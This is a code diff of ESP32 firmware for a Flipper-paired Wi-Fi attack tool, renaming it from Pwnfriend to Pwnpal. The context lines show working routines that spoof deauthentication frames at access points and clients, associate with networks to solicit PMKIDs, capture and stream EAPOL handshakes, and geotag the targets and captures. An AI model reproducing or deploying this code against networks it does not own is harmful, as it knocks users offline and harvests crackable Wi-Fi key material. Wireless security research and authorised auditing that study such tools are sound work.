@@ -1,6 +1,6 @@
-#include "Pwnfriend.h"
-#include "pwnfriend_frames.h" // pure, host-testable 802.11 parsers (see tests/)
-#include "pwnfriend_commit.h" // PWNFRIEND_FW_COMMIT, baked at build (see apply_pwnfriend.py)
+#include "Pwnpal.h"
+#include "pwnpal_frames.h" // pure, host-testable 802.11 parsers (see tests/)
+#include "pwnpal_commit.h" // PWNPAL_FW_COMMIT, baked at build (see apply_pwnpal.py)
 
 #include <LinkedList.h>
 #include <ArduinoJson.h>
@@ -44,13 +44,13 @@ static const char* FACE_GLYPHS[] = {
 };
 static const int NUM_FACE_GLYPHS = sizeof(FACE_GLYPHS) / sizeof(FACE_GLYPHS[0]);
 
-const char* pwnfriend_face_glyph(int idx) {
+const char* pwnpal_face_glyph(int idx) {
     if (idx < 0 || idx >= NUM_FACE_GLYPHS) return FACE_GLYPHS[21];  // default: Friend
     return FACE_GLYPHS[idx];
 }
 
 // copy keeping only printable non-quoting chars, so a hostile peer name can't
-// break the single-line PWNFRIEND_PEER framing.
+// break the single-line PWNPAL_PEER framing.
 static void sanitize(const char* in, char* out, size_t out_sz) {
     size_t j = 0;
     for(size_t i = 0; in && in[i] && j < out_sz - 1; i++) {
@@ -183,18 +183,18 @@ static bool parse_bssid12(const char* s, uint8_t out[6]) {
     return true;
 }
 
-Pwnfriend::Pwnfriend() {
+Pwnpal::Pwnpal() {
     reset();
 }
 
-void Pwnfriend::reset() {
+void Pwnpal::reset() {
     strncpy(_name, "flippy", sizeof(_name));
     _name[sizeof(_name) - 1] = '\0';
     // recognisable valid 64-hex default; Flipper supplies a real one via -id.
     strncpy(_identity, "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef0",
             sizeof(_identity));
     _identity[sizeof(_identity) - 1] = '\0';
-    _face = pwnfriend_face_glyph(21);
+    _face = pwnpal_face_glyph(21);
     _pwnd_run = 0;
     _pwnd_tot = 0;
     _uptime = 0;
@@ -242,7 +242,7 @@ void Pwnfriend::reset() {
 }
 
 // back to a fresh RECON sweep from hop index 0 (called at reset and scan start).
-void Pwnfriend::resetPhase() {
+void Pwnpal::resetPhase() {
     _phase = PHASE_RECON;
     _phase_ms = millis();
     _last_hop_ms = 0;   // hop on the very first tick
@@ -255,14 +255,14 @@ void Pwnfriend::resetPhase() {
 
 // epoch over: roll the inactive streak (slows next recon when nothing lands) and
 // restart RECON. `_epoch` is owned by the Flipper (-e).
-void Pwnfriend::endEpoch(uint32_t now) {
+void Pwnpal::endEpoch(uint32_t now) {
     // telemetry: one line per epoch for offline tuning.
     int attackable_n = 0;
     for (int i = 0; i < _n_recon; i++)
         if (attackable(_recon[i])) attackable_n++;
     char line[200];
     int n = snprintf(line, sizeof(line),
-        "PWNFRIEND_EPOCH {\"n\":%lu,\"recon\":%d,\"attackable\":%d,\"chans\":%d,\"assoc\":%u,"
+        "PWNPAL_EPOCH {\"n\":%lu,\"recon\":%d,\"attackable\":%d,\"chans\":%d,\"assoc\":%u,"
         "\"deauth\":%u,\"unicast\":%u,\"sta\":%d,\"hs\":%u,\"pmkid\":%u,\"miss\":%u,"
         "\"dpmf\":%u,\"dnocli\":%u}\n",
         (unsigned long)_epoch_seq, _n_recon, attackable_n, _n_attack, (unsigned)_ep_assoc,
@@ -290,7 +290,7 @@ void Pwnfriend::endEpoch(uint32_t now) {
 }
 
 // AP-bearing channels, most-populated first (agent.py get_access_points_by_channel).
-void Pwnfriend::buildAttackList() {
+void Pwnpal::buildAttackList() {
     _n_attack = 0;
     uint8_t count[15] = {0};
     for (int i = 0; i < _n_recon; i++) {
@@ -315,7 +315,7 @@ void Pwnfriend::buildAttackList() {
 }
 
 // worth attacking? not captured, not off-target, not whitelisted.
-bool Pwnfriend::attackable(const ReconAP& ap) const {
+bool Pwnpal::attackable(const ReconAP& ap) const {
     // eligible for assoc/PMKID. no RSSI floor: assoc is cheap and clientless; the floor
     // only gates deauth (see deauthable).
     if (isPwnd(ap.bssid)) return false;
@@ -325,12 +325,12 @@ bool Pwnfriend::attackable(const ReconAP& ap) const {
 }
 
 // deauth needs a link the client can hear, so it keeps the RSSI floor. rssi 0 = unknown -> allow.
-bool Pwnfriend::deauthable(const ReconAP& ap) const {
+bool Pwnpal::deauthable(const ReconAP& ap) const {
     return ap.rssi == 0 || ap.rssi >= _attack_min_rssi;
 }
 
 // recently-seen client? deauth without one is wasted (nothing replays the 4-way).
-bool Pwnfriend::hasClient(int ap_idx) const {
+bool Pwnpal::hasClient(int ap_idx) const {
     uint32_t now = millis();
     for (int s = 0; s < _n_sta; s++)
         if (_sta[s].ap_idx == (uint8_t)ap_idx && (uint32_t)(now - _sta[s].last_seen) < STA_TTL_MS)
@@ -338,7 +338,7 @@ bool Pwnfriend::hasClient(int ap_idx) const {
     return false;
 }
 
-int Pwnfriend::clientCount(int ap_idx) const {
+int Pwnpal::clientCount(int ap_idx) const {
     uint32_t now = millis();
     int n = 0;
     for (int s = 0; s < _n_sta; s++)
@@ -349,7 +349,7 @@ int Pwnfriend::clientCount(int ap_idx) const {
 
 // directed wildcard-SSID probe so a nameless AP replies with its ESSID (reportAP
 // adopts it), making a keymat-only capture crackable.
-void Pwnfriend::probeAP(const uint8_t* bssid) {
+void Pwnpal::probeAP(const uint8_t* bssid) {
     uint8_t f[32];
     int p = 0;
     f[p++] = 0x40; f[p++] = 0x00;          // FC: mgmt, subtype 4 = probe request
@@ -364,14 +364,14 @@ void Pwnfriend::probeAP(const uint8_t* bssid) {
     esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
 }
 
-bool Pwnfriend::isWhitelisted(const uint8_t* bssid) const {
+bool Pwnpal::isWhitelisted(const uint8_t* bssid) const {
     for (int i = 0; i < _n_wl; i++)
         if (memcmp(_wl[i], bssid, 6) == 0) return true;
     return false;
 }
 
 // dwell scaled by attackable AP count so busy channels get the airtime.
-uint32_t Pwnfriend::channelDwellMs(uint8_t channel) {
+uint32_t Pwnpal::channelDwellMs(uint8_t channel) {
     // weight eligible APs; ones with a client count double (deauth can force a 4-way there).
     int weight = 0;
     for (int i = 0; i < _n_recon; i++)
@@ -385,7 +385,7 @@ uint32_t Pwnfriend::channelDwellMs(uint8_t channel) {
 
 // on channel entry: assoc (solicit PMKID) + full deauth pass (broadcast + unicast each
 // client). one attack/epoch/AP for miss accounting; deauth re-kicked mid-dwell by deauthChannelPass().
-void Pwnfriend::attackChannel(uint8_t channel) {
+void Pwnpal::attackChannel(uint8_t channel) {
     for (int i = 0; i < _n_recon; i++) {
         if (_recon[i].channel != channel || !attackable(_recon[i])) continue;
         if (_assoc_policy) {
@@ -418,7 +418,7 @@ void Pwnfriend::attackChannel(uint8_t channel) {
             char mac[18];
             fmt_mac(mac, _recon[i].bssid);
             char line[40];
-            int n = snprintf(line, sizeof(line), "PWNFRIEND_MISS %s\n", mac);
+            int n = snprintf(line, sizeof(line), "PWNPAL_MISS %s\n", mac);
             if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
         }
     }
@@ -426,7 +426,7 @@ void Pwnfriend::attackChannel(uint8_t channel) {
 
 // deauth-only re-kick every DEAUTH_REPEAT_MS during the dwell: clients reconnect at
 // random offsets, so repeated kicks catch more 4-ways than one burst.
-void Pwnfriend::deauthChannelPass(uint8_t channel) {
+void Pwnpal::deauthChannelPass(uint8_t channel) {
     for (int i = 0; i < _n_recon; i++) {
         if (_recon[i].channel != channel || !attackable(_recon[i])) continue;
         // same gate as entry: skip too-weak, PMF, or clientless APs.
@@ -441,8 +441,8 @@ void Pwnfriend::deauthChannelPass(uint8_t channel) {
     }
 }
 
-bool Pwnfriend::configureFromArgs(LinkedList<String>* args) {
-    // args->get(0) == "pwnfriend"; scan for flags.
+bool Pwnpal::configureFromArgs(LinkedList<String>* args) {
+    // args->get(0) == "pwnpal"; scan for flags.
     int prev_pinned = _pinned_channel;   // detect an actual channel-tune change below
     bool prev_deauth = _deauth_policy;   // ...and an actual capture-policy change
     bool prev_assoc = _assoc_policy;
@@ -470,7 +470,7 @@ bool Pwnfriend::configureFromArgs(LinkedList<String>* args) {
                 _session_id[b] = (uint8_t)strtol(pair, nullptr, 16);
             }
         } else if (flag == "-f") {
-            _face = pwnfriend_face_glyph(val.toInt());
+            _face = pwnpal_face_glyph(val.toInt());
         } else if (flag == "-pr") {
             _pwnd_run = (uint32_t)val.toInt();
         } else if (flag == "-pt") {
@@ -536,7 +536,7 @@ bool Pwnfriend::configureFromArgs(LinkedList<String>* args) {
     return true;
 }
 
-void Pwnfriend::buildJson(char* out, size_t out_len) {
+void Pwnpal::buildJson(char* out, size_t out_len) {
     // compact so the whole advert fits ONE vendor IE (<=255B): sniffpwn scans a single
     // contiguous {..}, so a split payload breaks detection. session id omitted — pwngrid
     // reads it from the frame's Addr3, not the JSON.
@@ -549,7 +549,7 @@ void Pwnfriend::buildJson(char* out, size_t out_len) {
              _deauth_policy ? "true" : "false");
 }
 
-void Pwnfriend::rebuild() {
+void Pwnpal::rebuild() {
     // 802.11 beacon header (38 bytes) then vendor IE 222 with the JSON payload.
     static const uint8_t HEADER[38] = {
         0x80, 0x00,                          // frame control: mgmt / beacon
@@ -576,7 +576,7 @@ void Pwnfriend::rebuild() {
     _frame_len = 38 + jlen;
 }
 
-void Pwnfriend::broadcast() {
+void Pwnpal::broadcast() {
     if (!_ready) return;
 
     uint32_t now = millis();
@@ -683,18 +683,18 @@ void Pwnfriend::broadcast() {
 
     // single write so it can't interleave with the rx callback's prints.
     char line[96];
-    int n = snprintf(line, sizeof(line), "PWNFRIEND_ADV name=%s ch=%u sent=%u ver=%d fw=%s\n",
-                     _name, (unsigned)_cur_channel, (unsigned)_sent, PWNFRIEND_PROTO,
-                     PWNFRIEND_FW_COMMIT);
+    int n = snprintf(line, sizeof(line), "PWNPAL_ADV name=%s ch=%u sent=%u ver=%d fw=%s\n",
+                     _name, (unsigned)_cur_channel, (unsigned)_sent, PWNPAL_PROTO,
+                     PWNPAL_FW_COMMIT);
     if (n < 0) return;
     if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
     Serial.write((const uint8_t*)line, n);
 }
 
 // deep-saver duty cycle. the pump acts on the return: 0 keep scanning, 1 doze now (stop
-// radio), 2 wake now (restart radio), 3 stay dozing. emits PWNFRIEND_DOZE while dozing so the
+// radio), 2 wake now (restart radio), 3 stay dozing. emits PWNPAL_DOZE while dozing so the
 // Flipper link watchdog doesn't cry "no ESP32".
-int Pwnfriend::saverTick(uint32_t now) {
+int Pwnpal::saverTick(uint32_t now) {
     if (_saver < 2) {
         if (_saver_idle) { _saver_idle = false; return 2; }  // left deep mid-doze -> wake radio
         return 0;
@@ -705,7 +705,7 @@ int Pwnfriend::saverTick(uint32_t now) {
             _saver_idle = true;
             _saver_phase_ms = now;
             _saver_hb_ms = now;
-            const char* d = "PWNFRIEND_DOZE\n";
+            const char* d = "PWNPAL_DOZE\n";
             Serial.write((const uint8_t*)d, 15);
             return 1;
         }
@@ -718,7 +718,7 @@ int Pwnfriend::saverTick(uint32_t now) {
     }
     if (now - _saver_hb_ms >= 3000) {  // < the Flipper's 5s link-timeout so it never cries
         _saver_hb_ms = now;
-        const char* d = "PWNFRIEND_DOZE\n";
+        const char* d = "PWNPAL_DOZE\n";
         Serial.write((const uint8_t*)d, 15);
     }
     return 3;
@@ -726,14 +726,14 @@ int Pwnfriend::saverTick(uint32_t now) {
 
 // periodic fix status so the Flipper can watch acquisition / log TTFF. throttled, and
 // emitted even with no fix (sats climbing from 0 is the useful signal). raw module strings.
-void Pwnfriend::reportGps(bool fix, int sats, float acc_m, const char* lat, const char* lon) {
+void Pwnpal::reportGps(bool fix, int sats, float acc_m, const char* lat, const char* lon) {
     uint32_t now = millis();
-    if (now - _last_gps_ms < PWNFRIEND_GPS_EMIT_MS) return;
+    if (now - _last_gps_ms < PWNPAL_GPS_EMIT_MS) return;
     _last_gps_ms = now;
     int acc = (int)(acc_m + 0.5f);
     if (acc < 0) acc = 0;
     char line[96];
-    int n = snprintf(line, sizeof(line), "PWNFRIEND_GPS fix=%d sats=%d acc=%d lat=%s lon=%s\n",
+    int n = snprintf(line, sizeof(line), "PWNPAL_GPS fix=%d sats=%d acc=%d lat=%s lon=%s\n",
                      fix ? 1 : 0, sats, acc, lat ? lat : "", lon ? lon : "");
     if (n < 0) return;
     if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
@@ -742,7 +742,7 @@ void Pwnfriend::reportGps(bool fix, int sats, float acc_m, const char* lat, cons
 
 // cache the live fix; when it's gone, hand back the last-known one if it's still fresh enough.
 // keeps geotagging APs/captures/peers through a walk's fix gaps (rough, refined later).
-bool Pwnfriend::geoResolve(bool has_fix, double* lat, double* lon) {
+bool Pwnpal::geoResolve(bool has_fix, double* lat, double* lon) {
     if (has_fix) {
         _have_lastfix = true;
         _lastfix_lat = *lat;
@@ -758,7 +758,7 @@ bool Pwnfriend::geoResolve(bool has_fix, double* lat, double* lon) {
     return false;
 }
 
-void Pwnfriend::reportPeer(const uint8_t* payload, int length, int rssi, int channel,
+void Pwnpal::reportPeer(const uint8_t* payload, int length, int rssi, int channel,
                            bool has_fix, double lat, double lon) {
     // locate the JSON like Marauder's processPwnagotchiBeacon.
     int start = 36, end = length;
@@ -788,10 +788,10 @@ void Pwnfriend::reportPeer(const uint8_t* payload, int length, int rssi, int cha
     char geo[48];
     fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
 
-    // one PWNFRIEND_-prefixed line, single write so it can't interleave with broadcast()'s prints.
+    // one PWNPAL_-prefixed line, single write so it can't interleave with broadcast()'s prints.
     char line[320];
     int n = snprintf(line, sizeof(line),
-        "PWNFRIEND_PEER {\"name\":\"%s\",\"identity\":\"%s\",\"pwnd_tot\":%d,"
+        "PWNPAL_PEER {\"name\":\"%s\",\"identity\":\"%s\",\"pwnd_tot\":%d,"
         "\"pwnd_run\":%d,\"uptime\":%ld,\"rssi\":%d,\"channel\":%d,\"deauth\":%s%s}\n",
         safe_name, safe_ident, pwnd_tot, pwnd_run, uptime, rssi, channel,
         deauth ? "true" : "false", geo);
@@ -800,19 +800,19 @@ void Pwnfriend::reportPeer(const uint8_t* payload, int length, int rssi, int cha
     Serial.write((const uint8_t*)line, n);
 }
 
-int Pwnfriend::reconIndex(const uint8_t* bssid) const {
+int Pwnpal::reconIndex(const uint8_t* bssid) const {
     for (int i = 0; i < _n_recon; i++)
         if (memcmp(_recon[i].bssid, bssid, 6) == 0) return i;
     return -1;
 }
 
-bool Pwnfriend::isPwnd(const uint8_t* bssid) const {
+bool Pwnpal::isPwnd(const uint8_t* bssid) const {
     for (int i = 0; i < _n_pwnd_seen; i++)
         if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return true;
     return false;
 }
 
-bool Pwnfriend::markPwnd(const uint8_t* bssid) {
+bool Pwnpal::markPwnd(const uint8_t* bssid) {
     for (int i = 0; i < _n_pwnd_seen; i++)
         if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return false;  // already counted
     if (_n_pwnd_seen >= MAX_PWND) return false;                  // table full: stop
@@ -820,7 +820,7 @@ bool Pwnfriend::markPwnd(const uint8_t* bssid) {
     return true;
 }
 
-void Pwnfriend::emitPwnd(const uint8_t* bssid, const char* ssid,
+void Pwnpal::emitPwnd(const uint8_t* bssid, const char* ssid,
                          const char* type, int channel, int rssi,
                          bool has_fix, double lat, double lon, bool active) {
     char mac[18];
@@ -829,7 +829,7 @@ void Pwnfriend::emitPwnd(const uint8_t* bssid, const char* ssid,
     fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
     char line[256];
     int n = snprintf(line, sizeof(line),
-        "PWNFRIEND_PWND {\"bssid\":\"%s\",\"ssid\":\"%s\",\"type\":\"%s\","
+        "PWNPAL_PWND {\"bssid\":\"%s\",\"ssid\":\"%s\",\"type\":\"%s\","
         "\"channel\":%d,\"rssi\":%d,\"via\":\"%s\"%s}\n",
         mac, ssid, type, channel, rssi, active ? "active" : "passive", geo);
     if (n < 0) return;
@@ -837,7 +837,7 @@ void Pwnfriend::emitPwnd(const uint8_t* bssid, const char* ssid,
     Serial.write((const uint8_t*)line, n);
 }
 
-void Pwnfriend::deauthAP(const uint8_t* bssid) {
+void Pwnpal::deauthAP(const uint8_t* bssid) {
     uint8_t f[26];
     memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
     memcpy(f + 10, bssid, 6);   // Addr2 = BSSID
@@ -846,7 +846,7 @@ void Pwnfriend::deauthAP(const uint8_t* bssid) {
         esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
 }
 
-void Pwnfriend::deauthClient(const uint8_t* bssid, const uint8_t* client) {
+void Pwnpal::deauthClient(const uint8_t* bssid, const uint8_t* client) {
     // spoof BOTH directions — what actually kicks a modern client (broadcast deauth is ignored).
     uint8_t f[26];
     memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
@@ -862,7 +862,7 @@ void Pwnfriend::deauthClient(const uint8_t* bssid, const uint8_t* client) {
         esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
 }
 
-void Pwnfriend::assocAP(const uint8_t* bssid, const char* ssid) {
+void Pwnpal::assocAP(const uint8_t* bssid, const char* ssid) {
     // open-system auth FIRST so the AP answers the assoc with EAPOL M1 (RSN PMKID);
     // a bare assoc-req is a class-2 frame it rejects.
     {
@@ -914,17 +914,17 @@ void Pwnfriend::assocAP(const uint8_t* bssid, const char* ssid) {
         esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
 }
 
-void Pwnfriend::streamFrameHex(const uint8_t* bssid, const uint8_t* frame, int length) {
+void Pwnpal::streamFrameHex(const uint8_t* bssid, const uint8_t* frame, int length) {
     if (length <= 0) return;
     static const char* hexd = "0123456789abcdef";
-    // "PWNFRIEND_HS "+bssid+' '+hex+'\n'. static (rx-callback only) so a big frame doesn't
+    // "PWNPAL_HS "+bssid+' '+hex+'\n'. static (rx-callback only) so a big frame doesn't
     // blow the stack; single write so it can't interleave with the main loop's prints.
     static char line[800];
-    const int PREFIX = 13;                          // "PWNFRIEND_HS "
+    const int PREFIX = 13;                          // "PWNPAL_HS "
     int max_bytes = (int)(sizeof(line) - PREFIX - 12 - 1 - 1) / 2;  // bssid+sp+nl
     if (length > max_bytes) length = max_bytes;     // truncate huge frames (ESSID near front survives)
     int p = 0;
-    memcpy(line, "PWNFRIEND_HS ", PREFIX); p = PREFIX;
+    memcpy(line, "PWNPAL_HS ", PREFIX); p = PREFIX;
     for (int i = 0; i < 6; i++) {
         line[p++] = hexd[bssid[i] >> 4];
         line[p++] = hexd[bssid[i] & 0x0f];
@@ -938,7 +938,7 @@ void Pwnfriend::streamFrameHex(const uint8_t* bssid, const uint8_t* frame, int l
     Serial.write((const uint8_t*)line, p);
 }
 
-void Pwnfriend::reportClient(const uint8_t* payload, int length) {
+void Pwnpal::reportClient(const uint8_t* payload, int length) {
     // harvest the client STA from a DATA frame for unicast deauth. allocation-free (rx
     // callback). client is the non-BSSID address per the DS bits.
     if (length < 24) return;
@@ -975,7 +975,7 @@ void Pwnfriend::reportClient(const uint8_t* payload, int length) {
     if (append) { __sync_synchronize(); _n_sta = slot + 1; }
 }
 
-void Pwnfriend::streamSyntheticBeacon(const uint8_t* bssid, const char* ssid) {
+void Pwnpal::streamSyntheticBeacon(const uint8_t* bssid, const char* ssid) {
     if (!ssid || !ssid[0]) return;                         // unknown/hidden -> can't help
     int slen = (int)strlen(ssid);
     if (slen > 32) slen = 32;
@@ -1004,7 +1004,7 @@ void Pwnfriend::streamSyntheticBeacon(const uint8_t* bssid, const char* ssid) {
     streamFrameHex(bssid, b, p);
 }
 
-bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int channel,
+bool Pwnpal::reportAP(const uint8_t* payload, int length, int rssi, int channel,
                          bool has_fix, double lat, double lon) {
     // beacon (0x80) or probe response (0x50): both carry the SSID IE after the same 12B
     // fixed params. probe responses recover ESSIDs we'd otherwise miss.
@@ -1041,20 +1041,20 @@ bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int chann
             fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
             char line[256];
             int n = snprintf(line, sizeof(line),
-                "PWNFRIEND_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d%s}\n",
+                "PWNPAL_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d%s}\n",
                 mac, ssid, channel, rssi, geo);
             if (n > 0)
                 Serial.write((const uint8_t*)line,
                              (size_t)(n >= (int)sizeof(line) ? sizeof(line) - 1 : n));
         }
         uint32_t now = millis();
-        if (now - _recon[known].last_rssi_ms >= PWNFRIEND_RSSI_EMIT_MS) {
+        if (now - _recon[known].last_rssi_ms >= PWNPAL_RSSI_EMIT_MS) {
             _recon[known].last_rssi_ms = now;
             char mac[18];
             fmt_mac(mac, bssid);
             char line[56];
             // append live clients + attack bursts aimed at this AP (Flipper AP-detail view)
-            int n = snprintf(line, sizeof(line), "PWNFRIEND_RSSI %s %d %d %d\n", mac, (int)r,
+            int n = snprintf(line, sizeof(line), "PWNPAL_RSSI %s %d %d %d\n", mac, (int)r,
                              clientCount(known), (int)_recon[known].attacks);
             if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
         }
@@ -1069,8 +1069,8 @@ bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int chann
     _recon[_n_recon].rssi = r;  // first-seen; refreshed on later beacons
     _recon[_n_recon].attacks = 0;
     _recon[_n_recon].missed = false;
-    _recon[_n_recon].pmf = pwnfriend_rsn_requires_pmf(payload, length); // 802.11w -> no deauth
-    _recon[_n_recon].last_rssi_ms = millis();  // the PWNFRIEND_AP line already carried it
+    _recon[_n_recon].pmf = pwnpal_rsn_requires_pmf(payload, length); // 802.11w -> no deauth
+    _recon[_n_recon].last_rssi_ms = millis();  // the PWNPAL_AP line already carried it
     // Publish the entry before bumping the count (rx-callback writer vs loop reader).
     __sync_synchronize();
     _n_recon++;
@@ -1084,7 +1084,7 @@ bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int chann
     fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
     char line[256];
     int n = snprintf(line, sizeof(line),
-        "PWNFRIEND_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,"
+        "PWNPAL_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,"
         "\"rssi\":%d%s}\n",
         mac, ssid, channel, rssi, geo);
     if (n < 0) return true;
@@ -1093,7 +1093,7 @@ bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int chann
     return true;
 }
 
-bool Pwnfriend::reportHandshake(const uint8_t* payload, int length, int rssi, int channel,
+bool Pwnpal::reportHandshake(const uint8_t* payload, int length, int rssi, int channel,
                                 bool has_fix, double lat, double lon) {
     // EAPOL 0x888e at [30..31], or [32..33] with a 2-byte QoS control.
     int eo;
